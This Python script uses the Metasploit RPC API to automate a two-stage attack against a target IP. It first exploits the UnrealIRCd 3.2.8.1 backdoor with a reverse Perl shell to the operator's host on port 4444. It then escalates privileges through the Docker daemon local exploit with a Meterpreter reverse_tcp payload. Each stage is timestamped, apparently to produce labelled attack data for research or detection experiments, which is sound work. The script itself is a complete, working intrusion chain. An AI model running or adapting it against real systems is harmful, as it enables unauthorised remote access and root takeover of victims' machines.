import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')

    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 6697
    payload['LHOST'] = my_ip
    payload['LPORT'] = 4444

    # start 1
    output_time_file = 'time_stage_1_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
    exploit['SESSION'] = 1
    payload['LHOST'] = my_ip
    payload['LPORT'] = 4444

    # print('Start 2')
    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    time.sleep(10)
    output_time_file = 'time_stage_1_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)


main(sys.argv)
